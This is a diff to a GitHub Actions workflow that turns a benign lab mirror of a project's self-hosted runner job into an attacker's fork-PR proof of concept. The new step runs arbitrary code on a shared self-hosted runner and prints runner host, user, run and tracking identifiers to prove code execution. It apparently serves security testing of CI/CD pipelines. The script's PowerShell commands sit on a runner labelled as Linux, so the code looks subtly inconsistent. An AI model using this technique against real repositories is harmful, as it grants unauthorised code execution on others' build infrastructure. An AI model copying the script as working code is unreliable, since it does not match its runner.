@@ -1,6 +1,9 @@
-# BENIGN lab mirror of nasa/fprime's ext-aarch64-linux-led-blinker.yml
-# Used only to demonstrate the fork-PR -> self-hosted runner mechanism
-# in a private repo owned by the tester. No real fprime code runs here.
+# POCON — Fork-controlled execution on a shared self-hosted runner (lab harness)
+#
+# This is the *attacker's* version of the workflow, pushed via a fork PR.
+# On pull_request from the fork, GitHub runs the fork's workflow file — the
+# exact mechanism exploited in the TensorFlow self-hosted runner disclosure.
+# This beacon proves the code-execution primitive without persistence or exfil.
 
 name: "Lab: AArch64 Linux LedBlinker (mirror)"
 
@@ -15,9 +18,18 @@ jobs:
   aarch64-integration:
     name: "AArch64 Linux Integration Tests"
     runs-on: [self-hosted, aarch64-linux]
-    timeout-minutes: 10
+    timeout-minutes: 5
     steps:
-      - name: "Idle check"
+      - name: "POCON — fork-controlled code on shared self-hosted runner"
         run: |
-          echo "Baseline: healthy workflow in default branch. No fork control here."
-          echo "event=${{ github.event_name }} ref=${{ github.ref }} head=${{ github.head_ref }}"
+          Write-Output "[POCON] event:          ${{ github.event_name }}"
+          Write-Output "[POCON] head branch:    ${{ github.head_ref }}"
+          Write-Output "[POCON] source repo:    ${{ github.repository }}"
+          Write-Output "[POCON] run id:         ${{ github.run_id }}"
+          Write-Output "[POCON] runner:         $env:COMPUTERNAME"
+          Write-Output "[POCON] runner user:    $env:USERNAME"
+          Write-Output "[POCON] RUNNER_TRACKING_ID: $env:RUNNER_TRACKING_ID"
+          Write-Output "[POCON] timestamp:      $(Get-Date -Format o)"
+          Write-Output ""
+          Write-Output "[POCON] SUCCESS: Fork-controlled workflow executed arbitrary steps"
+          Write-Output "[POCON] on a shared self-hosted runner - CICD-SEC-04 proven."
